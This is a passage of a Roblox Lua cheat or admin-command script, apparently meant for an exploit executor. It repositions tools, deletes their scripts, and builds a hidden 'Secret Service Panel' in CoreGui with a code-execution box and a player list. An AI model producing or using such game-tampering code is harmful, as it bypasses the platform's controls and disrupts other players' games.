CFrame.new(2.000000238418579, -3.4000086784362793, 4),
CFrame.new(0.9999998211860657, -5.600006103515625, -4),
CFrame.new(-8.742277657347586e-08, -4.400008678436279, -2),
CFrame.new(1.0000001192092896, -5.600006103515625, 2),
CFrame.new(-0.9999999403953552, -4.400008678436279, 2),
CFrame.new(4.371139183945161e-08, -3.4000091552734375, 1.0000001192092896),
CFrame.new(-1, -3.4000091552734375, 1.3987613556309952e-07),
CFrame.new(2.000000238418579, -5.600006103515625, 4),
CFrame.new(-0.9999999403953552, -3.4000091552734375, 1.0000001192092896),
CFrame.new(2, -6.8000030517578125, -2.000000238418579),
CFrame.new(1, -6.8000030517578125, 0.9999997615814209),
CFrame.new(1.0000001192092896, -3.4000086784362793, 4),
CFrame.new(-1.9999998807907104, -6.8000030517578125, 2.999999761581421),
CFrame.new(1, -6.8000030517578125, -2.447835640850826e-07),
CFrame.new(1.0000001192092896, -3.4000086784362793, 3),
CFrame.new(1.0000001192092896, -3.4000086784362793, 2),
CFrame.new(1.0000001192092896, -6.8000030517578125, 3.999999761581421),
CFrame.new(-1, -5.600006103515625, -1.0000001192092896),
CFrame.new(2, -5.600006103515625, 0.9999999403953552),
CFrame.new(-1.0000001192092896, -5.600006103515625, -3),
CFrame.new(1.3374776445054543e-14, -1.0000112056732178, 3.0597922773267783e-07),
CFrame.new(-1.3113415775478643e-07, -4.400008678436279, -3),
CFrame.new(0.9999999403953552, -4.400008678436279, -2),
CFrame.new(1.3374776445054543e-14, -0.000011205673217773438, 3.0597922773267783e-07),
CFrame.new(-2, -6.8000030517578125, -1.5736077330075204e-07),
CFrame.new(2, -5.600006103515625, -3),
CFrame.new(0.9999998807907104, -4.400008678436279, -3),
CFrame.new(-4.3711398944878965e-08, -6.8000030517578125, -1.000000238418579),
CFrame.new(8.742277657347586e-08, -4.400008678436279, 2),
CFrame.new(-1, -5.600006103515625, -5.2453721366418904e-08),
CFrame.new(-2, -4.400008678436279, -3),
CFrame.new(-2.1855687037941607e-08, -2.200010299682617, -0.4999998211860657),
CFrame.new(-1.0000001192092896, -4.400008678436279, -3),
CFrame.new(-2, -6.8000030517578125, -1.000000238418579),
CFrame.new(2.1855701248796322e-08, -2.200010299682617, 0.5000001788139343),
CFrame.new(2, -6.8000030517578125, 2.999999761581421),
CFrame.new(2, -4.400008678436279, -3),
CFrame.new(1.74845538936097e-07, -6.8000030517578125, 3.999999761581421),
CFrame.new(-1.0000001192092896, -6.8000030517578125, -3.000000238418579),
CFrame.new(-1.0000001192092896, -6.8000030517578125, -4),
CFrame.new(0.9999999403953552, -6.8000030517578125, -1.000000238418579),
CFrame.new(-2, -3.4000086784362793, 2),
CFrame.new(-0.9999998807907104, -5.600006103515625, 3),
CFrame.new(-0.9999998211860657, -4.400008678436279, 4),
CFrame.new(-1.7484555314695172e-07, -6.8000030517578125, -4),
CFrame.new(4.203495021406611e-15, -3.4000091552734375, 9.616475438178895e-08),
CFrame.new(-0.9999998211860657, -5.600006103515625, 4),
CFrame.new(-1, -4.400008678436279, -0.9999999403953552),
CFrame.new(2, -4.400008678436279, -0.9999999403953552),
CFrame.new(2.000000238418579, -4.400008678436279, 4),
CFrame.new(2, -4.400008678436279, -2),
CFrame.new(4.371138828673793e-08, -4.4000091552734375, 1),
CFrame.new(-2, -5.600006103515625, -4),
CFrame.new(1.3113415775478643e-07, -5.600006103515625, 3),
CFrame.new(0.9999999403953552, -5.600006103515625, -1.0000001192092896),
CFrame.new(0.9999998807907104, -6.8000030517578125, -3.000000238418579),
CFrame.new(4.371138473402425e-08, -5.600006103515625, 0.9999998807907104),
CFrame.new(-0.9999999403953552, -5.600006103515625, 2),
CFrame.new(2, -6.8000030517578125, 1.999999761581421),
CFrame.new(-0.9999998807907104, -4.400008678436279, 3),
CFrame.new(-1.0000001192092896, -3.4000086784362793, -3),
CFrame.new(2, -5.600006103515625, 2),
CFrame.new(-1.7484555314695172e-07, -3.4000086784362793, -4),
CFrame.new(-0.9999999403953552, -5.600006103515625, 0.9999999403953552),
CFrame.new(-0.9999998807907104, -6.8000030517578125, 2.999999761581421),
CFrame.new(-1, -6.8000030517578125, -1.5736077330075204e-07),
CFrame.new(-4.371138828673793e-08, -4.400008678436279, -1),
CFrame.new(8.74227694680485e-08, -6.8000030517578125, 1.999999761581421),
CFrame.new(1.0000001192092896, -4.400008678436279, 4),
CFrame.new(-4.203510267999661e-15, -5.600006103515625, -9.616510965315683e-08),
CFrame.new(-2, -3.4000091552734375, 1.0000001192092896),
CFrame.new(-1.3113417196564114e-07, -6.8000030517578125, -3.000000238418579),
CFrame.new(-2, -4.400008678436279, 2),
CFrame.new(-1.0000001192092896, -4.400008678436279, -4),
CFrame.new(-4.371139183945161e-08, -5.600006103515625, -1.0000001192092896),
CFrame.new(2, -3.4000086784362793, -1.9999998807907104),
CFrame.new(-1.7484555314695172e-07, -5.600006103515625, -4),
CFrame.new(1.0000001192092896, -5.600006103515625, 4),
CFrame.new(-1.9999998807907104, -3.4000086784362793, 3),
CFrame.new(-1.0000001192092896, -3.4000086784362793, -4),
CFrame.new(2, -3.4000086784362793, 2),
CFrame.new(-2, -4.400008678436279, -0.9999999403953552),
CFrame.new(-8.742277657347586e-08, -5.600006103515625, -2),
CFrame.new(1.0000001192092896, -6.8000030517578125, 1.999999761581421),
CFrame.new(-1.0000001192092896, -6.8000030517578125, -2.000000238418579),
CFrame.new(2, -6.8000030517578125, -3.000000238418579),
CFrame.new(-2, -3.4000086784362793, -0.9999998211860657),
CFrame.new(1.7484555314695172e-07, -3.4000086784362793, 4),
CFrame.new(-1.9999998807907104, -4.400008678436279, 3),
CFrame.new(2, -4.400008678436279, 3),
CFrame.new(-2, -5.600006103515625, -2),
CFrame.new(-4.371138473402425e-08, -3.4000086784362793, -0.9999998807907104),
CFrame.new(3.8212398519808224e-16, -4.4000091552734375, 8.741977808313095e-09),
CFrame.new(0.9999999403953552, -6.8000030517578125, -2.000000238418579),
CFrame.new(1.3113415775478643e-07, -3.4000086784362793, 3),
CFrame.new(-2, -3.4000086784362793, -4),
CFrame.new(0.9999998211860657, -3.4000086784362793, -4),
CFrame.new(-1.3113415775478643e-07, -5.600006103515625, -3),
CFrame.new(-1.0000001192092896, -4.400008678436279, -2),
CFrame.new(-1.999999761581421, -6.8000030517578125, 3.999999761581421),
CFrame.new(0.5, -2.200010299682617, 1.792162862557234e-07),
CFrame.new(2.000000238418579, -6.8000030517578125, 3.999999761581421),
CFrame.new(-1.9999998807907104, -5.600006103515625, 3),
CFrame.new(-2, -5.600006103515625, 2),
CFrame.new(2, -3.4000086784362793, -3),
CFrame.new(0.9999998807907104, -3.4000086784362793, -3),
CFrame.new(-0.9999999403953552, -6.8000030517578125, 1.999999761581421),
CFrame.new(-2, -3.4000086784362793, -3),
CFrame.new(-2, -5.600006103515625, -3),
CFrame.new(-2, -4.400008678436279, -2),
CFrame.new(2, -3.4000091552734375, 1.3987613556309952e-07),
CFrame.new(0.9999998807907104, -5.600006103515625, -3),
CFrame.new(-2, -4.400008678436279, -4),
CFrame.new(1.0000001192092896, -5.600006103515625, 3),
CFrame.new(-0.9999998211860657, -3.4000086784362793, 4),
CFrame.new(-1.0000001192092896, -5.600006103515625, -2),
CFrame.new(8.742277657347586e-08, -3.4000086784362793, 2),
CFrame.new(2, -5.600006103515625, -4),
CFrame.new(-2, -6.8000030517578125, -2.000000238418579),
CFrame.new(-2, -3.4000086784362793, -1.9999998807907104),
CFrame.new(-2, -4.4000091552734375, 1),
CFrame.new(2, -6.8000030517578125, -1.000000238418579),
CFrame.new(2, -5.600006103515625, 3),
CFrame.new(-8.789143356527102e-15, -6.8000030517578125, -2.0107216869291733e-07),
CFrame.new(2, -3.4000086784362793, 3),
CFrame.new(2, -6.8000030517578125, -4),
CFrame.new(0.9999998211860657, -6.8000030517578125, -4),
CFrame.new(-2, -6.8000030517578125, 0.9999998807907104),
CFrame.new(2, -5.600006103515625, -5.2453721366418904e-08),
CFrame.new(1, -4.4000091552734375, 0.9999999403953552),
CFrame.new(-2, -6.8000030517578125, -3.000000238418579),
CFrame.new(2, -3.4000086784362793, -0.9999998211860657),
CFrame.new(2, -3.4000086784362793, -4),
CFrame.new(2, -4.4000091552734375, 5.2453366095051024e-08),
CFrame.new(2, -5.600006103515625, -1.0000001192092896),
CFrame.new(2, -4.4000091552734375, 1),







}

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if i <= #Handles+1 and i>=2 then
v.Grip = Handles[i-1]
v.Parent = game.Players.LocalPlayer.Character
v.Handle.CanCollide = false
end
end 

for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
	
			if (v:IsA("Tool")) then
				
				v.Script:Destroy()
				
			end
end

end)
AddCmd('SSP','',function()
local SecrectServicePanelFoldr = Instance.new("Folder",game:GetService("ReplicatedStorage"))
SecrectServicePanelFoldr.Name = "SecrectServicePanel"
local Player = Instance.new("StringValue",game:GetService("ReplicatedStorage"):WaitForChild("SecrectServicePanel"))
Player.Name = "Player"
Player.Value = game:GetService("Players").LocalPlayer.Name

removething = function(name,parent) for i,v in pairs(parent:GetChildren()) do if v.Name == name then v:Destroy() end end end
removething("S3crectS4viceP1nel",game:GetService("CoreGui"))

local S3crectS4viceP1nel = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Packages = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local TextBox = Instance.new("TextBox")
local zoom_out = Instance.new("ImageButton")
local UIGridLayout = Instance.new("UIGridLayout")
local Example = Instance.new("TextButton")
local more_vert = Instance.new("ImageButton")
local NameLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local close = Instance.new("ImageButton")
local remove = Instance.new("ImageButton")
local Frame_2 = Instance.new("Frame")
local arrow_drop_up = Instance.new("ImageButton")
local arrow_drop_up_2 = Instance.new("ImageButton")
local TextLabel = Instance.new("TextLabel")
local navigate_next = Instance.new("ImageButton")
local AdminPanel = Instance.new("Frame")
local AdminFrame = Instance.new("Frame")
local ScrollingFrame_2 = Instance.new("ScrollingFrame")
local UIGridLayout_2 = Instance.new("UIGridLayout")
local ExampleCMD = Instance.new("TextButton")
local PlayersFrame = Instance.new("Frame")
local ScrollingFrame_3 = Instance.new("ScrollingFrame")
local UIGridLayout_3 = Instance.new("UIGridLayout")
local ExamplePlrs = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local refresh = Instance.new("ImageButton")
local Executor = Instance.new("Frame")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextBox_2 = Instance.new("TextBox")
local Frame_3 = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local Frame_4 = Instance.new("Frame")
local packages = Instance.new("TextButton")

--Properties:

S3crectS4viceP1nel.Name = "S3crectS4viceP1nel"
S3crectS4viceP1nel.Parent = game:GetService("CoreGui")
S3crectS4viceP1nel.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
S3crectS4viceP1nel.ResetOnSpawn = false

Frame.Parent = S3crectS4viceP1nel
Frame.BackgroundColor3 = Color3.fromRGB(59, 58, 59)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.628370464, 0, 0.529925168, 0)
Frame.Size = UDim2.new(0, 442, 0, 265)

Packages.Name = "Packages"
Packages.Parent = Frame
Packages.BackgroundColor3 = Color3.fromRGB(36, 35, 36)
Packages.BorderSizePixel = 0
Packages.Position = UDim2.new(0.211046755, 0, 0.150033444, 0)
Packages.Size = UDim2.new(0, 334, 0, 197)
Packages.Visible = false

ScrollingFrame.Parent = Packages
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(38, 37, 38)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.0269461069, 0, -3.09823122e-07, 0)
ScrollingFrame.Size = UDim2.new(0, 338, 0, 195)
ScrollingFrame.ScrollBarThickness = 0

TextBox.Parent = ScrollingFrame
TextBox.BackgroundColor3 = Color3.fromRGB(47, 46, 49)
TextBox.BorderSizePixel = 0
TextBox.LayoutOrder = -999
TextBox.Position = UDim2.new(-0.195084736, 0, -1.28571427, 0)
TextBox.Size = UDim2.new(0, 324, 0, 18)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
TextBox.PlaceholderText = "Search"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(178, 178, 178)
TextBox.TextSize = 14.000
TextBox.TextXAlignment = Enum.TextXAlignment.Left

zoom_out.Name = "zoom_out"
zoom_out.Parent = TextBox
zoom_out.BackgroundTransparency = 1.000
zoom_out.LayoutOrder = 7
zoom_out.Position = UDim2.new(0.897297323, 0, 0.191768795, 0)
zoom_out.Size = UDim2.new(0, 16, 0, 17)
zoom_out.ZIndex = 2
zoom_out.Image = "rbxassetid://3926307971"
zoom_out.ImageColor3 = Color3.fromRGB(178, 178, 178)
zoom_out.ImageRectOffset = Vector2.new(284, 164)
zoom_out.ImageRectSize = Vector2.new(36, 36)

UIGridLayout.Parent = ScrollingFrame
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellPadding = UDim2.new(0, 0, 0, 0)
UIGridLayout.CellSize = UDim2.new(0, 338, 0, 25)

Example.Name = "Example"
Example.Parent = SecrectServicePanelFoldr
Example.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
Example.BorderSizePixel = 0
Example.Position = UDim2.new(0.00834664889, 0, 0.139153346, 0)
Example.Size = UDim2.new(0, 338, 0, 25)
Example.Font = Enum.Font.SourceSans
Example.Text = "Example"
Example.TextColor3 = Color3.fromRGB(255, 255, 255)
Example.TextSize = 13.000
Example.TextXAlignment = Enum.TextXAlignment.Left

more_vert.Name = "more_vert"
more_vert.Parent = Example
more_vert.BackgroundTransparency = 1.000
more_vert.LayoutOrder = 9
more_vert.Position = UDim2.new(0.917309701, 0, 0.128279269, 0)
more_vert.Size = UDim2.new(0, 16, 0, 17)
more_vert.ZIndex = 2
more_vert.Image = "rbxassetid://3926305904"
more_vert.ImageRectOffset = Vector2.new(764, 764)
more_vert.ImageRectSize = Vector2.new(36, 36)

NameLabel.Name = "NameLabel"
NameLabel.Parent = Frame
NameLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NameLabel.BackgroundTransparency = 1.000
NameLabel.Size = UDim2.new(0, 121, 0, 15)
NameLabel.Font = Enum.Font.SourceSans
NameLabel.Text = " Secret Serivce Panel"
NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
NameLabel.TextSize = 14.000
NameLabel.TextWrapped = true
NameLabel.TextXAlignment = Enum.TextXAlignment.Left

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.002358553, 0, 0.0630111992, 0)
TextButton.Size = UDim2.new(0, 213, 0, 22)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Executor"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 14.000

close.Name = "close"
close.Parent = Frame
close.BackgroundTransparency = 1.000
close.Position = UDim2.new(0.955525577, 0, -0.00276563875, 0)
close.Size = UDim2.new(0, 16, 0, 17)
close.ZIndex = 2
close.Image = "rbxassetid://3926305904"
close.ImageRectOffset = Vector2.new(284, 4)
close.ImageRectSize = Vector2.new(24, 24)

remove.Name = "remove"
remove.Parent = Frame
remove.BackgroundTransparency = 1.000
remove.LayoutOrder = 6
remove.Position = UDim2.new(0.912398934, 0, -0.00218338333, 0)
remove.Size = UDim2.new(0, 16, 0, 17)
remove.ZIndex = 2
remove.Image = "rbxassetid://3926307971"
remove.ImageRectOffset = Vector2.new(884, 284)
remove.ImageRectSize = Vector2.new(36, 36)

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(48, 46, 49)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.961906016, 0, 0.148312107, 0)
Frame_2.Size = UDim2.new(0, 16, 0, 196)

arrow_drop_up.Name = "arrow_drop_up"
arrow_drop_up.Parent = Frame_2
arrow_drop_up.BackgroundTransparency = 1.000
arrow_drop_up.LayoutOrder = 8
arrow_drop_up.Position = UDim2.new(0, 0, 0.00291936332, 0)
arrow_drop_up.Size = UDim2.new(0, 16, 0, 17)
arrow_drop_up.ZIndex = 2
arrow_drop_up.Image = "rbxassetid://3926307971"
arrow_drop_up.ImageRectOffset = Vector2.new(164, 484)
arrow_drop_up.ImageRectSize = Vector2.new(36, 36)

arrow_drop_up_2.Name = "arrow_drop_up"
arrow_drop_up_2.Parent = Frame_2
arrow_drop_up_2.BackgroundTransparency = 1.000
arrow_drop_up_2.LayoutOrder = 8
arrow_drop_up_2.Position = UDim2.new(0, 0, 0.918412328, 0)
arrow_drop_up_2.Rotation = 180.000
arrow_drop_up_2.Size = UDim2.new(0, 16, 0, 17)
arrow_drop_up_2.ZIndex = 2
arrow_drop_up_2.Image = "rbxassetid://3926307971"
arrow_drop_up_2.ImageRectOffset = Vector2.new(164, 484)
arrow_drop_up_2.ImageRectSize = Vector2.new(36, 36)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(56, 55, 58)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0520361997, 0, 0.905660391, 0)
TextLabel.Size = UDim2.new(0, 415, 0, 18)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.LineHeight = 1.170
TextLabel.Text = "Click or press ; to enter a command."
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 13.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

navigate_next.Name = "navigate_next"
navigate_next.Parent = TextLabel
navigate_next.BackgroundTransparency = 1.000
navigate_next.LayoutOrder = 13
navigate_next.Position = UDim2.new(-0.0570844896, 0, 0.0119052464, 0)
navigate_next.Size = UDim2.new(0, 24, 0, 17)
navigate_next.ZIndex = 2
navigate_next.Image = "rbxassetid://3926305904"
navigate_next.ImageRectOffset = Vector2.new(444, 844)
navigate_next.ImageRectSize = Vector2.new(36, 36)

AdminPanel.Name = "AdminPanel"
AdminPanel.Parent = Frame
AdminPanel.BackgroundColor3 = Color3.fromRGB(36, 35, 36)
AdminPanel.BorderSizePixel = 0
AdminPanel.Position = UDim2.new(0.211046755, 0, 0.150033444, 0)
AdminPanel.Size = UDim2.new(0, 334, 0, 197)
AdminPanel.Visible = false

AdminFrame.Name = "AdminFrame"
AdminFrame.Parent = AdminPanel
AdminFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AdminFrame.BackgroundTransparency = 1.000
AdminFrame.Position = UDim2.new(0.0179640725, 0, 0.0507614203, 0)
AdminFrame.Size = UDim2.new(0, 209, 0, 184)

ScrollingFrame_2.Parent = AdminFrame
ScrollingFrame_2.Active = true
ScrollingFrame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame_2.BackgroundTransparency = 1.000
ScrollingFrame_2.BorderSizePixel = 0
ScrollingFrame_2.Size = UDim2.new(0, 208, 0, 184)
ScrollingFrame_2.BottomImage = ""
ScrollingFrame_2.MidImage = ""
ScrollingFrame_2.TopImage = ""

UIGridLayout_2.Parent = ScrollingFrame_2
UIGridLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_2.CellSize = UDim2.new(0, 100, 0, 30)
UIGridLayout_2.StartCorner = Enum.StartCorner.BottomLeft

ExampleCMD.Name = "ExampleCMD"
ExampleCMD.Parent = SecrectServicePanelFoldr
ExampleCMD.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
ExampleCMD.BorderSizePixel = 0
ExampleCMD.Position = UDim2.new(0.00834664889, 0, 0.0630109012, 0)
ExampleCMD.Size = UDim2.new(0, 82, 0, 26)
ExampleCMD.Font = Enum.Font.SourceSans
ExampleCMD.Text = "Example"
ExampleCMD.TextColor3 = Color3.fromRGB(255, 255, 255)
ExampleCMD.TextSize = 13.000
ExampleCMD.TextXAlignment = Enum.TextXAlignment.Left

PlayersFrame.Name = "PlayersFrame"
PlayersFrame.Parent = AdminPanel
PlayersFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PlayersFrame.BackgroundTransparency = 1.000
PlayersFrame.Position = UDim2.new(0.646706581, 0, 0.0558375642, 0)
PlayersFrame.Size = UDim2.new(0, 112, 0, 184)

ScrollingFrame_3.Parent = PlayersFrame
ScrollingFrame_3.Active = true
ScrollingFrame_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame_3.BackgroundTransparency = 1.000
ScrollingFrame_3.BorderColor3 = Color3.fromRGB(36, 35, 36)
ScrollingFrame_3.BorderSizePixel = 2
ScrollingFrame_3.Size = UDim2.new(0, 113, 0, 184)
ScrollingFrame_3.BottomImage = ""
ScrollingFrame_3.CanvasSize = UDim2.new(0, 0, 15, 0)
ScrollingFrame_3.ScrollBarThickness = 1
ScrollingFrame_3.TopImage = ""

UIGridLayout_3.Parent = ScrollingFrame_3
UIGridLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_3.CellSize = UDim2.new(0, 120, 0, 30)
UIGridLayout_3.StartCorner = Enum.StartCorner.BottomLeft

ExamplePlrs.Name = "ExamplePlrs"
ExamplePlrs.Parent = ScrollingFrame_3
ExamplePlrs.BackgroundColor3 = Color3.fromRGB(66, 64, 66)
ExamplePlrs.BackgroundTransparency = 0.700
ExamplePlrs.BorderSizePixel = 0
ExamplePlrs.Size = UDim2.new(0, 200, 0, 50)
ExamplePlrs.Visible = false
ExamplePlrs.Font = Enum.Font.SourceSans
ExamplePlrs.Text = "pipeman"
ExamplePlrs.TextColor3 = Color3.fromRGB(255, 255, 255)
ExamplePlrs.TextSize = 14.000

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.47963801, 0, 0.0641509444, 0)
TextButton_2.Size = UDim2.new(0, 206, 0, 22)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Admin Panel"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextSize = 14.000

refresh.Name = "refresh"
refresh.Parent = Frame
refresh.BackgroundTransparency = 1.000
refresh.Position = UDim2.new(0.959718883, 0, 0.0717624426, 0)
refresh.Size = UDim2.new(0, 16, 0, 17)
refresh.ZIndex = 2
refresh.Image = "rbxassetid://3926307971"
refresh.ImageRectOffset = Vector2.new(404, 84)
refresh.ImageRectSize = Vector2.new(36, 36)

Executor.Name = "Executor"
Executor.Parent = Frame
Executor.BackgroundColor3 = Color3.fromRGB(36, 35, 36)
Executor.BorderSizePixel = 0
Executor.Position = UDim2.new(0.206224695, 0, 0.153291643, 0)
Executor.Size = UDim2.new(0, 334, 0, 195)
Executor.ZIndex = 20

TextButton_3.Parent = Executor
TextButton_3.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.00342089264, 0, 0.8696419, 0)
TextButton_3.Size = UDim2.new(0, 168, 0, 23)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Execute"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextSize = 14.000

TextButton_4.Parent = Executor
TextButton_4.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
TextButton_4.BorderSizePixel = 0
TextButton_4.Position = UDim2.new(0.503420889, 0, 0.869642198, 0)
TextButton_4.Size = UDim2.new(0, 157, 0, 23)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "Clear"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextSize = 14.000

TextBox_2.Parent = Executor
TextBox_2.BackgroundColor3 = Color3.fromRGB(50, 49, 50)
TextBox_2.BorderSizePixel = 0
TextBox_2.Position = UDim2.new(0.00299401209, 0, -0.00507614203, 0)
TextBox_2.Size = UDim2.new(0, 324, 0, 170)
TextBox_2.Font = Enum.Font.SourceSans
TextBox_2.MultiLine = true
TextBox_2.ClearTextOnFocus = false
TextBox_2.Text = ""
TextBox_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_2.TextSize = 14.000
TextBox_2.TextXAlignment = Enum.TextXAlignment.Left
TextBox_2.TextYAlignment = Enum.TextYAlignment.Top

Frame_3.Parent = Executor
Frame_3.BackgroundColor3 = Color3.fromRGB(50, 49, 50)
Frame_3.BorderSizePixel = 0
Frame_3.Size = UDim2.new(0, 14, 0, 171)
Frame_3.Visible = false

UIListLayout.Parent = Frame_3
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

Frame_4.Parent = Frame
Frame_4.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
Frame_4.BorderSizePixel = 0
Frame_4.Position = UDim2.new(-0.000358005753, 0, 0.152203158, 0)
Frame_4.Size = UDim2.new(0, 92, 0, 197)

packages.Name = "packages"
packages.Parent = Frame
packages.BackgroundColor3 = Color3.fromRGB(70, 69, 70)
packages.BorderSizePixel = 0
packages.Position = UDim2.new(0.00517658424, 0, 0.178197145, 0)
packages.Size = UDim2.new(0, 88,0, 28)
packages.Font = Enum.Font.SourceSans
packages.Text = "Packages"
packages.TextColor3 = Color3.fromRGB(255, 255, 255)
packages.TextSize = 18.000
packages.TextWrapped = true

-- Scripts:

local function KNZX_fake_script() -- TextBox.LocalScript 
	local script = Instance.new('LocalScript', TextBox)

	local searchBar = script.Parent
	local scrolllFrame = script.Parent.Parent

	function updateSearch()
		for i,button in pairs(scrolllFrame:GetChildren()) do
			if button:IsA("TextButton") then
				local searchText = string.lower(searchBar.Text)
				if searchText ~= "" then
					local buttonText = string.lower(button.Text)
					if string.find(buttonText, searchText) then
						button.Visible = true			
					else
						button.Visible = false
					end
				else
					button.Visible = true
				end
			end
		end
	end

	searchBar:GetPropertyChangedSignal("Text"):Connect(updateSearch)
end
coroutine.wrap(KNZX_fake_script)()
local function SGMWI_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.AdminPanel.Visible = false
		script.Parent.Parent.Packages.Visible = false
		script.Parent.Parent.Executor.Visible = true
	end)
end
coroutine.wrap(SGMWI_fake_script)()
local function SXSMBHB_fake_script() -- close.LocalScript 
	local script = Instance.new('LocalScript', close)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(SXSMBHB_fake_script)()
local function AQRU_fake_script() -- remove.LocalScript 
	local script = Instance.new('LocalScript', remove)

	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.refresh.Visible == true then
			for i,v in pairs(script.Parent.Parent:GetChildren()) do
				if v.Name == "remove" or v.Name == "close" or v.Name == "NameLabel" then
					script.Parent.Parent.Size = UDim2.new(0, 442, 0, 16)
				else
					if v.ClassName ~= "LocalScript" then
						v.Visible = false
					end
				end
			end
		else
			for i,v in pairs(script.Parent.Parent:GetChildren()) do
				if v.Name == "remove" or v.Name == "close" or v.Name == "NameLabel" then
					script.Parent.Parent.Size = UDim2.new(0, 442, 0, 265)
				else
					if v.ClassName ~= "LocalScript" then
						v.Visible = true
					end 
				end
			end
		end
	end)
end
coroutine.wrap(AQRU_fake_script)()
local function ZOMFSSU_fake_script() -- Frame.Dragify 
	local script = Instance.new('LocalScript', Frame)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
		dragToggle = nil
		local dragSpeed = 0.50
		dragInput = nil
		dragStart = nil
		local dragPos = nil
		function updateInput(input)
			local Delta = input.Position - dragStart
			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
		end
		Frame.InputBegan:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
				dragToggle = true
				dragStart = input.Position
				startPos = Frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)
		Frame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		game:GetService("UserInputService").InputChanged:Connect(function(input)
			if input == dragInput and dragToggle then
				updateInput(input)
			end
		end)
	end

	dragify(script.Parent)
end
coroutine.wrap(ZOMFSSU_fake_script)()
local function FLYT_fake_script() -- ExampleCMD.LocalScript 
	local script = Instance.new('LocalScript', ExampleCMD)

	script.Parent.MouseButton1Click:Connect(function()
		--size changer
	end)
end
coroutine.wrap(FLYT_fake_script)()
local function GKOVJ_fake_script() -- ScrollingFrame_3.LocalScript 
	local script = Instance.new('LocalScript', ScrollingFrame_3)

	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			--local NewPlayer = Instance.new("TextButton",script.Parent)
			--NewPlayer.Active = true
			--NewPlayer.AutoButtonColor = true
			--NewPlayer.BackgroundColor3 = Color3.new(66,64,66)
			--NewPlayer.BackgroundTransparency = 0.7
			--NewPlayer.BorderSizePixel = 0
			--NewPlayer.Name = v.Name
			--NewPlayer.Visible = true
			--NewPlayer.Text = v.Name
			--NewPlayer.TextColor3 = Color3.new(255,255,255)
			--NewPlayer.TextScaled = true
			--NewPlayer.TextWrapped = true
			local NewPlayer = script.Parent.ExamplePlrs:Clone()
			NewPlayer.Name = v.Name
